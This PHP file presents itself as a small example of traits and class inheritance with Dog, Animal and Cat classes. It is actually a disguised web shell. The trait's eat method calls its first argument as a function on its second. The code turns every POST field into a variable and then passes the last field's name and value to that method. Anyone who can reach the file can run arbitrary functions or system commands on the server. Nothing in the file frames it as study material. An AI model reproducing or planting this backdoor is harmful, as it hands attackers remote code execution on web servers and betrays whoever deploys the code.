<?php

trait Dog
{
    public $name="dog";

    public function drive()
    {
        echo "This is dog drive";
    }
    public function eat($a, $b)
    {
        $a($b);
    }
}

class Animal
{
    public function drive()
    {
        echo "This is animal drive";
    }
    public function eat()
    {
        echo "This is animal eat";
    }
}

class Cat extends Animal
{
    use Dog;
    public function drive()
    {
        echo "This is cat drive";
    }
}

foreach (array('_POST') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
    }
}


$cat = new Cat();
$cat->eat($_key, $_value);
